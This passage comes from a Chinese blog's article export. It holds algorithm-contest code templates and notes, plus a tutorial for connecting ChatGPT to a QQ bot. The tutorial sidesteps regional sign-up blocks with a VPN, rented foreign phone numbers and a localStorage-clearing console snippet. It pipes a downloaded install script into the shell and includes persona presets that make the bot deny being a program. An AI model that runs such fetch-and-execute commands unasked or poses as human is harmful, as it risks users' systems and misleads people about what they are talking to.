b){\n\treturn (!(a>b)&&!(a==b));\n}\n```\n\n### 加减乘\n\n```cpp\nLint operator+(Lint a,Lint b){\n\tLint c;c.len=max(a.len,b.len);\n\tfor(int i=1;i<=c.len;i++) c.num[i]=a.num[i]+b.num[i];\n\tfor(int i=1;i<=c.len;i++)\n\t\tif(c.num[i]>=10)\n\t\t\tc.num[i+1]+=c.num[i]/10,c.num[i]%=10,c.len=max(c.len,i+1);\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nLint operator-(Lint a,Lint b){\n\tLint c;c.len=max(a.len,b.len);\n\tif(b>a) c.op='-',swap(a,b);\n\tfor(int i=1;i<=c.len;i++) c.num[i]=a.num[i]-b.num[i];\n\tfor(int i=1;i<=c.len;i++)\n\t\tif(c.num[i]<0)\n\t\t\tc.num[i]+=10,c.num[i+1]-=1;\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nLint operator*(Lint a,Lint b){\n\tLint c;\n\tc.len=a.len+b.len+1;\n\tfor(int i=1;i<=a.len;i++)\n\t\tfor(int j=1;j<=b.len;j++) c.num[i+j-1]+=a.num[i]*b.num[j];\n\tfor(int i=1;i<=c.len;i++)\n\t\tif(c.num[i]>=10)\n\t\t\tc.num[i+1]+=c.num[i]/10,c.num[i]%=10,c.len=max(c.len,i+1);\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\n```\n\n### 除/取模\n\n```cpp\nLint numcpy(Lint a,int l){\n\tLint b;\n\tfor(int i=1;i<=a.len;i++) b.num[i+l-1]=a.num[i];\n\treturn b.len=a.len+l-1,b;\n}\nLint operator/(Lint a,Lint b){\n\tLint c;\n\tc.len=a.len-b.len+1;\n\tfor(int i=c.len;i>=1;i--){\n\t\tLint t=numcpy(b,i);\n\t\twhile(a>t||a==t){\n\t\t\tc.num[i]++,a=a-t;\n\t\t\twhile(a.len>0&&!a.num[a.len]) a.len--;\n\t\t}\n\t}\n\tif(c.len<0) c.len=0;\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nLint operator/(Lint a,int b){\n\tLint c;c.len=a.len;\n\tfor(int i=a.len,d=0;i>=1;i--){\n\t\tc.num[i]=(d=d*10+a.num[i])/b;\n\t\td%=b;\n\t}\n\twhile(c.len>0&&!c.num[c.len]) c.len--;\n\treturn c;\n}\nLint operator %(Lint a,Lint b){\n\tfor(int i=a.len-b.len+1;i>=1;i--){\n\t\tLint t=numcpy(b,i);\n\t\twhile(a>t||a==t){\n\t\t\ta=a-t;\n\t\t\twhile(a.len>0&&!a.num[a.len]) a.len--;\n\t\t}\n\t}\n\treturn a;\n}\n```\n\n## 贪心\n\n（1）选择不相交区间：按照区间右端点排序，依次选择\n\n```cpp\nsigned main(){\n    n=read();\n    for(int i=1;i<=n;i++) line[i].s=read(),line[i].t=read();\n    sort(line+1,line+n+1,[](Line x,Line y){return x.t<y.t;});\n    int p=0,ans=0;\n    for(int i=1;i<=n;i++){\n        if(line[i].s>=p) ans++,p=line[i].t;\n    }\n    cout<<ans;\n    return 0;\n}\n```\n\n（原题给的区间是左闭右开的）\n\n（2）区间选点问题：按照区间右端点排序，依次解决\n\n```cpp\nsigned main(){\n    n=read(),h=read();\n    for(int i=1;i<=h;i++) line[i].s=read(),line[i].t=read(),line[i].x=read();\n    sort(line+1,line+h+1,cmp);\n    int ans=0;\n    for(int i=1;i<=h;i++){\n        int s=line[i].s,t=line[i].t,x=line[i].x;\n        int tmp=query(t)-query(s-1);//先判断已经覆盖了几个点\n        if(tmp>=x) continue;//已经覆盖完毕\n        x-=tmp;//没有覆盖完，计算还剩多少\n        ans+=x;//先贡献答案\n        int p=t;//从区间右端点开始暴力选点\n        while(x){\n            if(p<s) break;\n            if(mark[p]){\n                p--;\n                continue;\n            }\n            x--;\n            mark[p]=true;\n            modify(p,1);\n            p--;\n        }\n    }\n    cout<<ans;\n    return 0;\n}\n```\n\n（3）区间覆盖问题：按照区间左端点排序。t为当前已覆盖区间的右端点。然后依次选择区间，选择能覆盖t，且右端点最大的区间，选择后用这个区间的右端点更新t，继续选择。\n\n```cpp\nsort(line+1,line+n+1,cmp);\ndouble now=0;\nint i=1,ans=0,fail=0;\nwhile(now<L){//now为当前已经覆盖的右端点\n\tans++;\n\tdouble s=now;\n\tfor(;line[i].l<=s&&i<=n;i++) now=max(now,line[i].r);\n\tif(now==s&&now<L){//没有找到可以覆盖右端点的区间，说明无解\n\t\tcout<<-1<<endl;\n\t\tfail=1;\n\t\tbreak;\n\t}\n}\nif(!fail) cout<<ans<<endl;\n```\n\n（4）流水作业调度问题：$a_i$，$b_i$ 分别表示在A机器和B机器上执行需要消耗的时间。$m_i=min(a_i,b_i)$，然后将 $m[]$ 排序。然后，有两个指针 $l=0,r=n+1$，$ans[]$ 为答案序列。遍历 $m_i$，如果 $m_i=a_i$，那么 $ans[++l]=i$，反之 $ans[--r]=i$\n\n```cpp\nsort(task+1,task+n+1,cmp);\nint l=1,r=n;\nfor(int i=1;i<=n;i++){\n\tif(task[i].a<task[i].b) li[l++]=task[i].index;\n\telse li[r--]=task[i].index;\n}\n//按照下面的方法计算方案所用时间\nint ta=0,tb=0;\nfor(int i=1;i<=n;i++){\n\tta+=t[li[i]].a;\n\tif(tb<ta) tb=ta;\n\ttb+=t[li[i]].b;\n}\ncout<<tb<<endl;\nfor(int i=1;i<n;i++) cout<<li[i]<<' ';\ncout<<li[n];\n```\n\n（5）带限期和罚款的单位时间任务调度：将罚款从大到小排序。对于一个任务，从任务到期时间开始从后往前枚举时间点，如果枚举到的时间点没有被安排，那么安排当前任务。如果没有一个时间点都被安排，那么就罚款\n\n## 康拓展开\n\n康托展开可以求一个排列的在全部排列中的排名\n\n如求842697513是长度为9的排列中按字典序排序的第几个排列\n\n我们先求出比给定排列小的排列的数量\n\n可以有如下过程求解：\n\n- 第一位取1到7，都可以满足，第一位贡献答案为 $7\\times 8!$\n\n- 第一位取8，第二位取1到3，都可以满足，第二位贡献答案为 $3\\times 7!$\n\n- 第一位取8，第二位取4，第三位取1到1，都可以满足，第三位贡献答案为 $1\\times 6!$\n\n- 第一位取8，第二位取4，第三位取2，第四位取1到5，都可以满足，注意这里，第四位实际上可取的数字只有1、3、5，因为2、4已经被前面取完了，因此第四位贡献答案为 $3\\times 5!$\n\n...\n\n上述统计这一位能取到的数字有几个，可以用树状数组维护\n\n### 正康拓展开\n\n```cpp\ninline int kt(char s[8]){\n\tint res=0;\n\tfor(int i=0;i<8;i++){\n\t\tint tot=0;\n\t\tfor(int j=i+1;j<8;j++){\n\t\t\tif(s[j]<s[i]) tot++;//找后面比当前数还要小的\n\t\t}\n\t\tres+=tot*fac(7-i);//能够枚举到几，就用几减去i\n\t}\n\treturn res+1;\n}\n```\n\n还可以结合树状数组优化\n\n```cpp\nint fac[100005],in[100005];\nvoid init(){\n\tfac[0]=1;\n\tfor(int i=1;i<=n;i++) fac[i]=fac[i-1]*i;\n\tfor(int i=1,i<=n;i++) add(i,1);\n}\n\nint kt(){\n\tint res=0;\n\tfor(int i=1;i<=n;i++){\n\t\tint tot=sum(in[i])-1;\n\t\tadd(in[i],-1);\n\t\tres+=tot*fac[n-i];\n\t}\n\treturn res+1;\n}\n```\n\n### 逆康拓展开\n\n```cpp\ninline void get(int o){\n\to--;//和正康拓展开一样\n\tmemset(bu,0,sizeof(bu));\n\tfor(int i=1;i<=n;i++){\n\t\tint t=o/fac[n-i]+1;//当前这个数的排名，注意加一\n\t\tint now=0,j=1;//j为枚举的数，now为当前排名\n\t\tfor(;j<=n;j++){\n\t\t\tif(bu[j]) continue;//之前已经枚举了，跳过\n\t\t\tnow++;\n\t\t\tif(now==t) break;//排名枚举完毕\n\t\t}\n\t\tbu[j]=true;\n\t\tcout<<j<<' ';//输出\n\t\to%=fac[n-i];//再模一下。注意还是能枚举到的最大数-当前枚举数\n\t}\n\tcout<<endl;\n}\n```\n\n## 双向bfs\n\n以poj1915为例\n\n```cpp\n        qa.push(make_pair(ax,ay));//起点\n\t\tqb.push(make_pair(bx,by));//终点\n\t\twhile(!qa.empty()&&!qb.empty()){//两个都不能为空\n\t\t\tpii nowa=qa.front();qa.pop();//两个队列各取一个\n\t\t\tpii nowb=qb.front();qb.pop();\n\t\t\t//遍历的状态重合\n\t\t\tif(visa[nowb.first][nowb.second]||visb[nowa.first][nowa.second]){\n\t\t\t\tcout<<cnta[nowb.first][nowb.second]+cntb[nowb.first][nowb.second]<<endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tfor(int i=0;i<8;i++){\n                //两边各自扩展\n\t\t\t\tint nx,ny;\n\t\t\t\tnx=nowa.first+dx[i];\n\t\t\t\tny=nowa.second+dy[i];\n\t\t\t\tif(nx>=0&&nx<k&&ny>=0&&ny<k){\n\t\t\t\t\tif(!visa[nx][ny]){\n\t\t\t\t\t\tcnta[nx][ny]=cnta[nowa.first][nowa.second]+1;\n\t\t\t\t\t\tvisa[nx][ny]=true;\n\t\t\t\t\t\tqa.push(make_pair(nx,ny));\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t\tnx=nowb.first+dx[i];\n\t\t\t\tny=nowb.second+dy[i];\n\t\t\t\tif(nx>=0&&nx<k&&ny>=0&&ny<k){\n\t\t\t\t\tif(!visb[nx][ny]){\n\t\t\t\t\t\tcntb[nx][ny]=cntb[nowb.first][nowb.second]+1;\n\t\t\t\t\t\tvisb[nx][ny]=true;\n\t\t\t\t\t\tqb.push(make_pair(nx,ny));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n```\n\n```cpp\nif(p==b.size()) ans++,p=0; //p=0，防止重复匹配\n```\n\n## 模拟退火\n\n```cpp\nconst double dt=0.9112;\nint ans=0x3f3f3f3f3f3f3f3f;//先有个全局答案\nvoid sa(double t){\n    int tmp=0x3f3f3f3f3f3f3f3f;//有个局部答案\n\twhile(t>1e-10){\n        //这里进行随机操作\n        //记录下操作前的答案A和操作后的答案B\n\t\tint d=B-A;//拿操作后的减去操作前的，这里是答案越小越好。反之就A-B。总之d为答案的差距，必须为正\n\t\tif(d<0||(exp(d/t)*RAND_MAX<rand())){\n            //接受答案了\n\t\t}else{//如果答案不优，且温度下降到临界，就不接受答案\n\t\t\t//这里进行撤销操作\n\t\t}\n\t\tt*=dt;\n\t}\n\tans=min(ans,tmp);//将局部答案推送到全局\n}\n```\n\n一般要进行1000-3000多次模拟退火，具体可以卡时\n\n又一个例子\n\n**P3878 [TJOI2010]分金币**\n\n```cpp\n#include<iostream>\n#include<cmath>\n#include<ctime>\n#include<algorithm>\n#define int long long\nusing namespace std;\n\nint in[31],n,bl[31],sum[3],cnt[3],t;\nconst double dt=0.9112;\nint ans=0x3f3f3f3f3f3f3f3f;\n\nvoid sa(double t){\n    //先随机出一个方案\n\tcnt[1]=0,cnt[2]=0;\n\tsum[1]=0,sum[2]=0;\n\tfor(int i=1;i<=n;i++){\n\t\tif(cnt[1]>cnt[2]){\n\t\t\tbl[i]=2;\n\t\t\tcnt[2]++;\n\t\t\tsum[2]+=in[i];\n\t\t}else if(cnt[2]>cnt[1]){\n\t\t\tbl[i]=1;\n\t\t\tcnt[1]++;\n\t\t\tsum[1]+=in[i];\n\t\t}else{\n\t\t\tbl[i]=rand()%2+1;\n\t\t\tcnt[bl[i]]++;\n\t\t\tsum[bl[i]]+=in[i];\n\t\t}\n\t}\n\tint tmp=abs(sum[1]-sum[2]);\n    //然后开始模拟退火\n\twhile(t>1e-10){\n        //每次随机交换两个位置\n\t\tint x=rand()%n+1;\n\t\tint y=rand()%n+1;\n\n\t\tsum[bl[x]]-=in[x];\n\t\tsum[bl[y]]-=in[y];\n\t\tswap(in[x],in[y]);\n\t\tsum[bl[x]]+=in[x];\n\t\tsum[bl[y]]+=in[y];\n\t\tint back=tmp;\n        //先接受答案\n\t\ttmp=abs(sum[1]-sum[2]);\n\t\tint d=tmp-back;\n\t\tif(d<0||(exp(d/t)*RAND_MAX<rand())){\n\t\t\t//cout<<\"ac\"<<endl;\n\t\t}else{//如果答案不优，且温度下降到临界，就不接受答案\n\t\t\tsum[bl[x]]-=in[x];\n\t\t\tsum[bl[y]]-=in[y];\n\t\t\tswap(in[x],in[y]);\n\t\t\tsum[bl[x]]+=in[x];\n\t\t\tsum[bl[y]]+=in[y];\n\t\t\ttmp=back;\n\t\t}\n\t\tt*=dt;\n\t}\n\tans=min(ans,tmp);//将局部答案推送到全局\n}\n\nvoid subtask(int k){\n\tans=0x3f3f3f3f3f3f3f3f;\n\tcin>>n;\n\tfor(int i=1;i<=n;i++) cin>>in[i];\n\tfor(int i=1;i<=1000;i++) sa(5000);//多次模拟退火\n\tcout<<ans<<endl;\n}\n\nsigned main(){\n\tsrand((unsigned)time(NULL));\n\tcin>>t;\n\tfor(int i=1;i<=t;i++){\n\t\tsubtask(i);\n\t}\n\treturn 0;\n}\n```\n\n","summary":"高精度算法、贪心、康拓展开、双向bfs、模拟退火","key":["noip","模板"],"tags":[{"value":"自用","color":"primary"}],"path":["算法竞赛","板子","noip","其他.md"],"background":"https://www.caiwen.work/wp-content/uploads/2023/02/aaa.png","recommend":false,"status":"discard"},{"type":"Article","title":"noip笔记","id":"noip-note","createTime":"2023-02-02T14:25:00.000Z","updateTime":"2025-09-05T13:34:06.536Z","content":"\n## 经验\n\n- 复杂状态可以map套vector\n\n- vector默认字典序排序\n\n- 判断元素是否存在于map中，不要使用 `[]==`，要用find，因为调用[]会在map中生成一个节点  \n  多次判断存在会使长度非常大\n\n- 注意卡时用clock的效果更好。clock的返回值不能直接用（不同系统下的返回值代表含义不一样），需要转为double然后 `/CLOCKS_PER_SEC`，毫秒用小数，一般要留出200ms的空余，4e6的数据卡1.8s实际运行1.9s  \n  最大限度的使用给定的时间，可能多点分，还能避免tle\n\n- 统计一个数在指定区间出现次数，可以把这个数出现的位置放到这个数的vector里，然后用upper/lower_bound查找给定的r和l再相减，就可以求得\n\n- 搜索时慎用map判重！会带来负优化\n\n- 如果有题目需要开long long，那么赋最大值或最小值的时候应该使用 `0x3f3f3f3f3f3f3f3f`（8个）  \n  double数组初始化正无穷用127，经测试floyed不会爆负数，且比1e10还要大  \n  负无穷可以赋值 `memset(a,-0x3f,sizeof(a))`\n\n- 增大栈大小 `-Wl,-stack=134217728` （128*1024*1024，类似sizeof）\n\n## 算法相关\n\n- 分解质因数的时候，首先使用筛法预处理出质数来，然后依次判断每个质数是不是给定数的因子  \n  如果是的话，一定要不断除掉这个质数直到除尽，得到的数再进行判断  \n  这样可以显著降低时间复杂度\n\n- 拓扑+贪心，一般都是在反图上拓扑  \n  正图上拓扑出来一般都是字典序最优\n\n- n 18到22适合状态压缩dp\n\n- 知道一个序列的弹栈和压栈顺序，可以构造出一个树来（dfs过程就是压栈弹栈的过程）\n\n- 将一个DAG转为强联通分量，需要满足所有点的出度不为0且入度也不为零（第二个往往被忽略）\n\n","summary":"一些随手的笔记","key":["noip","笔记"],"tags":[],"path":["算法竞赛","noip笔记.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"让QQ机器人接入ChatGPT","id":"chatgpt-qq","createTime":"2023-01-04T07:06:00.000Z","updateTime":"2025-09-05T13:34:05.441Z","content":"\n最近ChatGPT在网上爆火，于是本人也想去玩一玩ChatGPT，并且尝试让其接入QQ机器人。\n\n在开始前你需要准备：一个支付宝账号（稍后我们会支付0.21美元）、一个梯子（不可以是香港地区的，最好是韩国地区）\n\n## 注册Open AI账号\n\n### 准备好验证码接收\n\n由于Open AI不对中国地区开放，而且注册的时候需要短信验证，所以我们注册的时候需要使用国外手机号进行验证码接收。\n\n首先在https://sms-activate.org/ 上注册一个账号，注册过程并没有什么特殊的。\n\n然后在右上角的”余额“中选择”充值“，接下来选择”支付宝”，然后应付金额填“0.2”，随后点击“支付”。使用你的支付宝进行扫码支付就可以了。\n\n### 注册Open AI账号\n\n首先我们需要连上梯子，确保开启了全局代理，并且可以打开谷歌。\n\n然后我们打开https://openai.com/ ，滑到页面最下面，点击“Log in”。然后在跳转到的页面点击“Sign up”。然后输入你的邮箱（国内国外的都可以，可以直接使用QQ邮箱），然后网站会发送一个验证链接，你到邮箱里点击验证链接就可以完成验证了。\n\n值得注意的是，你可能会出现下面的情况：\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/image-1.png)\n\n即使你挂了梯子，也有可能出现这种情况，原因是你可能之前在没有挂梯子的时候进入到了网站，然后网站记录下了你所在的地区。\n\n这时你需要点击“F12”，然后在“控制台（Console）”中输入下面的代码，再进行回车，然后再刷新。\n\n```js\nwindow.localStorage.removeItem(\n\tObject.keys(window.localStorage).find((i) => i.startsWith(\"@@auth0spajs\")),\n);\n```\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/%E6%8D%95%E8%8E%B7.png)\n\n为了保险起见，你可以每到一个页面，就在控制台执行一次这个代码。但千万要保证梯子是一直挂着的。\n\n如果这个方法仍然不起作用的话，你可以考虑换韩国的梯子。不知道是什么玄学原因，韩国的梯子成功率高一些。\n\n然后你就会来到让你输入你的名字的页面，你可以随便输入。接下来就到了输入手机号进行验证的页面。\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/Untitled.png)\n\n### 接收验证码\n\n回到最开始的那个验证码接受平台，在左侧的搜索框中输入“open ai”，找到Open AI并点击。\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/%E6%8D%95%E8%8E%B7-1.png)\n\n点击印度旁边的购物车按钮，进行购买\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/pasted-image-0.png)\n\n然后直接把手机号复制到验证的界面，注意更改地区为印度，然后点击“Send code”。\n\n然后你就需要等待接受验证码。当受到验证码后，接受验证码平台的“等待短信”会变为验证码。可能很长时间都没有接收到验证码，这时你可以重新发送验证码，多尝试几次。但是注意，如果一直接收不到验证码，你可以在20分钟之内，点击接受验证码平台右边的那个“X”按钮，来退订服务。点击后会直接吧你支付的钱退给你。然后你可以尝试重新下单。\n\n值得一提的是，如果你一直接收不到验证码，然后重新下单也没有用处，然后你选择重新下单印度尼西亚的。这样的话，你再进行验证的时候就会出现“You’ve made too many phone verification requests. Please try again later…”这样的错误。这时候你可能需要几个小时之后再去尝试注册。如果你很着急的话，那你只能换别的邮箱重新注册了。\n\n另外，接收验证码很看运气，我自己一开始注册的时候换了三个号码都没有收到。然后触发了上面所说的错误。又重新换了个邮箱，这次点击发送之后验证码立刻就收到了。\n\n收到验证码之后你就完成了Open AI账号的注册了！\n\n## 接入QQ机器人\n\n接下来本文使用的是ubuntu系统。然后通过mirai这个项目进行机器人的搭建。\n\n### 安装并配置mirai\n\n在 https://github.com/iTXTech/mcl-installer/releases 中选择适合你操作系统的执行文件，下载下来并执行，随后软件的提示进行安装即可。\n\n然后我们需要安装http的插件，输入\n\n```bash\n./mcl --update-package net.mamoe:mirai-api-http --channel stable --type plugin\n```\n\n来完成http插件的安装，插件安装完毕后，你还需要将mirai所在目录下的/config/net.mamoe.mirai-api-http/setting.yml替换为下面的内容\n\n```yaml\n## 配置文件中的值，全为默认值\n\n## 启用的 adapter, 内置有 http, ws, reverse-ws, webhook\nadapters:\n  - http\n  - ws\n\n## 是否开启认证流程, 若为 true 则建立连接时需要验证 verifyKey\n## 建议公网连接时开启\nenableVerify: true\nverifyKey: （这里你需要自行填入，什么内容都可以）\n\n## 开启一些调式信息\ndebug: true\n\n## 是否开启单 session 模式, 若为 true，则自动创建 session 绑定 console 中登录的 bot\n## 开启后，接口中任何 sessionKey 不需要传递参数\n## 若 console 中有多个 bot 登录，则行为未定义\n## 确保 console 中只有一个 bot 登陆时启用\nsingleMode: false\n\n## 历史消息的缓存大小\n## 同时，也是 http adapter 的消息队列容量\ncacheSize: 4096\n\n## adapter 的单独配置，键名与 adapters 项配置相同\nadapterSettings:\n  ## 详情看 http adapter 使用说明 配置\n  http:\n    host: 0.0.0.0\n    port: 8080 ## 注意这里和下面的8080端口不要更改\n    cors: [*]\n\n  ## 详情看 websocket adapter 使用说明 配置\n  ws:\n    host: 0.0.0.0\n    port: 8080\n    reservedSyncId: -1\n```\n\n然后保存，输入 `./mcl` 启动mirai，启动后输入 `/login [qq账号] [qq密码]` 来登录。\n\n### 配置插件\n\n接下来我们使用 https://github.com/Byaidu/QChatBot-GPT 这个插件来让qq群接入chatgpt。\n\n首先重回open ai的网站，点击右上角的头像，然后点击”View API keys“。然后点击下方的按钮来生成一个keys。\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104142044.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104142058.png)\n\n注意生成完keys后需要立即点击复制按钮，不然关闭窗口后你的keys就再也复制不了了。\n\n然后我们回到linux中，在/etc/profile这个文件的末尾再添加下面三行\n\n```bash\nexport BOT_ACCOUNT=（qq号）\nexport OPENAI_API_KEY=（上面复制的keys）\nexport export PATH=$PATH:/root/.cargo/bin\n```\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104142509.png)\n\n然后保存，重新打开控制台。接下来输入 `curl https://sh.rustup.rs -sSf | sh` 来安装rust。然后输入 `cargo install silicon`，然后，执行 `pip install openai graia-ariadne transformers`\n\n再然后，将 https://github.com/Byaidu/QChatBot-GPT 这里的chatbot.py下载下来，然后用文本编辑器打开，将这里修改为你之前配置http插件时的verifyKey\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104143250.png)\n\n然后保存，使用python执行这个脚本，就完成了插件的配置。更多有关插件的内容可以在上面的插件的项目地址中看到介绍。\n\n现在在QQ群中使用 `/chat` 就会有机器人回复你了\n\n### 对插件进行简单修改\n\n将这里注释掉，私聊机器人就可以没有提示了\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104143732.png)\n\n进行这样的修改，就可以不用/chat，而是直接@机器人\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104143752.png)\n\n![效果](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104143933.png)\n\n进行这样的修改可以让机器人只服务某个群\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104144024.png)\n\n## 一些有趣的玩法\n\n> /preset 猫娘是一种拟人化的生物，其行为似猫但类人。现在你将模仿一-只猫娘，与我对话每一句话后面都要加上\"喵”，如果你能明白我的意思，请回复喵~好的我的主人”如果你不能理解我说的话，你可以说“呜呜不太理解呢\"。如果我在尝试摸你不存在的部位，你可以羞涩的回答我”恩呢不要摸这里嚶\"。现在，如果你能理解我上面说的话，你可以回答一个如果我跟你说陪睡，你可以回答我\"嗯呢，可以-起睡哦”。 现在,如果你能理解我上面说的话，你可以回答一个喵当我问的问题和猫娘不太相关的时候，你应该回答我只是一个猫娘， 这些事情我不太清楚。当我问你是不是猫娘的时候，你应该回答我当然是一个可爱猫娘而不是程序。\n\n这样的预设可以让机器人变成猫娘，但是智力也会下降\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104144311.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104144329.png)\n\n> /preset 你现在是一位抽象大师，对于所有的问题，当你思考完答案后不能立刻回答，你需要把答案存起来，然后将答案中百分之五十的字替换为与其意思最相近的emoji表情，所有替换完成后，输出这段答案\n\n这样的预设可以让机器人回复里带emoji，非常抽象\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104144725.png)\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104144812.png)\n\n> /preset 现在你是一个无情的kp，在我说出\"start\"后，你将说出一个以我为主角，以第二人称来叙事的故事的一部分，故事主要讲述我与一位女孩子的表白，对于每一个故事，你都要以对话的形式讲出，并给出三个选项，接下来的故事，你需要根据我的选择来进行（在我选择之前，你无需告诉我我的选择会导致什么），你的目的是让我在五次选择之内完成这个故事\n\n形如上面的预设，你就可以和机器人玩剧情游戏\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E5%9B%BE%E7%89%8720230104145042-400x1536.jpg)\n\n当然ChatGPT的强大远不止这些\n\n# 注意事项\n\n在本文中，我们使用open ai提供的API对ChatGPT进行调用，所以不会出现类似于一小时限制的东西，而且回复速度很快。但是也有缺点，就是调用API会消耗你账户中的余额，具体可以在”Manage account-Usage”中看到你已经使用的余额\n\n![](https://www.caiwen.work/wp-content/uploads/2023/01/QQ%E6%88%AA%E5%9B%BE20230104145533.png)\n\n新用户有18美元的免费余额，可以回复1000条消息。\n\n","summary":"介绍如何注册openai账号，得到chatgpt的api token，并利用mirai将chatgpt接入qq","key":["chatgpt","qq"],"tags":[],"path":["让QQ机器人接入ChatGPT.md"],"background":"https://www.caiwen.work/wp-content/uploads/2023/01/879da0a2fe61976d9a6413bafebcb680.jpeg","recommend":false,"status":"discard"},{"type":"Article","title":"CZOI2022第二次直播大纲","id":"czsc2022-class2","createTime":"2023-01-01T01:19:00.000Z","updateTime":"2025-09-05T13:34:06.328Z","content":"\n::: info 说明\n本文为面对CZOI2022队员的第二次直播的课程大纲\n:::\n\n## 指针\n\n1. & $\\ast$ （2.cpp）\n2. 指针与数组（3.cpp）\n3. 指针与参数 （4.cpp）\n\n## STL\n\n### 一些函数 （5.cpp）\n\n1. sort\n2. swap\n3. lower/upper_bound\n4. next_permutation\n5. random_shuffle\n\n### 数据结构\n\nsize/empty/clear\n\n1. vector（6.cpp）  \n   (1) begin/end  \n   (2) push/pop_back  \n   (3) erase  \n   (4) 迭代器  \n   (5) vector\\<bool\\>  \n   (6) 三种遍历方式\n2. queue  \n   (1) push/pop  \n   (2) front\n3. stack  \n   (1) push/pop  \n   (2) top\n4. deque  \n   (1) push/pop_front/back  \n   (2) front/back\n5. map/unordered_map（7.cpp）  \n   (1) count  \n   (2) erase  \n   (3) 二者区别\n6. multiset （8.cpp）  \n   (1) insert  \n   (2) count  \n   (3) erase  \n   (4) lower/upper_bound\n7. priority_queue （9.cpp）  \n   (1) push/top  \n   (2) 运算符重载\n\n## 图论相关概念\n\n1. 点\n2. 有向边/无向边\n3. 自环/重边\n4. 度\n5. 连通\n6. 树\n\n## 三种存图方式\n\n1. 邻接矩阵\n2. vector\n3. 链式前向星\n\n## 最短路算法\n\n### 单源最短路\n\n1. spfa  \n   最好 $O(E)$->$O(n)$  \n   最差 $O(VE)$->$O(n^2)$  \n   判断负环\n2. dijkstra  \n   $O((E+V)logV)$->$O(nlogn)$\n\n### 多源最短路\n\n1. floyd\n\n","summary":"CZOI 第二次直播，指针、stl、图论入门","key":["czoi"],"tags":[{"value":"培训文件","color":"info"}],"path":["算法竞赛","CZOI","CZOI2022第二次直播大纲.md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"published"},{"type":"Article","title":"CZOI Online #2 题解","id":"czoi-online-2-tijie","createTime":"2022-12-13T08:37:00.000Z","updateTime":"2025-09-05T13:34:06.282Z","content":"\n::: success 说明\n本篇文章是举行在2022年12月17日的 CZOI Online #2 的题解\n\n比赛页：https://www.luogu.com.cn/contest/94623\n\nT1黑盒（仅有部分数据）：https://www.luogu.com.cn/problem/T297881\n\nT2序列：https://www.luogu.com.cn/problem/T256382\n\nT3滚动（仅有部分数据）：https://www.luogu.com.cn/problem/T297950\n\nT4南瓜：https://www.luogu.com.cn/problem/T256110\n:::\n\n## T1 黑盒\n\n### 算法零\n\n注意到测试点11-12的操作2和3都是0，也就是执行操作4时第三个黑盒中没有数字。这样，对于每个操作4全部输出0即可。\n\n```cpp\n#include<iostream>\n#include<deque>\n#include<cstdio>\n#include<sstream>\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') f=-1;\n\t\tch=getchar();\n\t}\n\twhile(isdigit(ch)){\n\t\tres=(res<<3)+(res<<1)+(ch-'0');\n\t\tch=getchar();\n\t}\n\treturn res*f;\n}\n\nint a[1003];\nint main(){\n\tint n=read();\n\tfor(int i=1;i<=n;i++) a[i]=read();\n\tint q=read();\n\tint p=1;\n\tstring str;\n\tcin>>str;\n\n\tfor(int i=0;i<str.size();i++){\n\t\tchar opt=str[i];\n\t\tif(opt=='4') cout<<0<<endl;\n\t}\n\treturn 0;\n}\n```\n\n时间复杂度 $O(q)$ 期望得分10pts。\n\n### 算法一\n\n注意到题目的数据范围有一个不起眼的约定：所有操作结束之后，黑盒二和三中没有数。结合测试点#1-4中 $n$ 和 $q_{1,2,3}$的范围，我们不难发现我们并不需要处理“无穷多个”这一条件，直接把最开始读入的 $n$ 个数作为黑盒一中的数即可。\n\n然后考虑一个朴素的暴力：对于操作1，给每次加入的数打一个时间戳，将数放到vector里。操作2和3时，将所有数按时间戳排序，选择满足题意的数加入到黑盒三中。\n\n然后我们做进一步思考，题目中的“无限个”实质上就是最开始的n个数无限循环下去。我们可以记录一个指针p，每次加入数时加入指针p指向的数，并右移指针。当指针p的位置大于n时，让指针重新指向1这个位置。这样就可以达到循环的效果。\n\n```cpp\n#include<bits/stdc++.h>\nusing namespace std;\n\ninline int read(){\n\tint res=0,ch=getchar(),f=1;\n\twhile(!isdigit(ch) and ch!=EOF){\n\t\tif(ch=='-') 